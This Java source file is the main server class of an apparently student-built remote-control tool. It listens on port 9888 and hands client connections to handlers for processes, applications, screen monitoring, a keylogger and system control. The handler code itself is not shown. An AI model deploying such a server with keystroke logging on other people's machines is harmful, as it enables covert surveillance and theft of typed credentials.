package team6.server;

import java.awt.AWTException;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import team6.server.handler.Applications;
import team6.server.handler.Keylogger;
import team6.server.handler.Monitor;
import team6.server.handler.Processes;
import team6.server.handler.SystemCtrl;
import team6.server.socket.SocketHandler;

public class Server {
    private ServerSocket serverSocket;
    private SocketHandler socketHandler;
    private final int port = 9888;
    
    private Processes processes;
    private Applications applications;
    private Monitor monitor;
    private Keylogger keylogger;
    private SystemCtrl systemCtrl;
    
    public Server(int port) throws IOException {
        serverSocket = new ServerSocket(port);
        while (true) {
            try {
                setUpConnections(port);
            } catch (Exception ex) {
                Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
                socketHandler.send(new String("<DISC>$<>").getBytes(), 9);
            }
        }
        
    }
    
    private void setUpConnections(int port) throws IOException, AWTException, InterruptedException {
        System.out.println("Waiting for new connection ...");
        Socket mainSocket = serverSocket.accept();
        socketHandler = new SocketHandler(mainSocket);
        System.out.println("Connected to new client");
        
        processes = new Processes(serverSocket.accept());
        applications = new Applications(serverSocket.accept());
        monitor = new Monitor(serverSocket.accept());
        keylogger = new Keylogger(serverSocket.accept());
        systemCtrl = new SystemCtrl(serverSocket.accept());
        
        while (!mainSocket.isClosed()) {
            String message = socketHandler.receive();
            if (message != null && message.equals("<DISC>$<>")) {
                disconnect();
            }
        }
    }
    
    private void disconnect() {
        try {
            processes.close();
            processes.stop();
            applications.close();
            applications.stop();
            monitor.close();
            monitor.stop();
            keylogger.close();
            keylogger.stop();
            systemCtrl.close();
            systemCtrl.stop();
            socketHandler.close();
        }
        catch(NullPointerException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        } 
        
    }
    
    public static void main(String args[]) {
        try {
            new Server(9888);
        } catch (IOException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
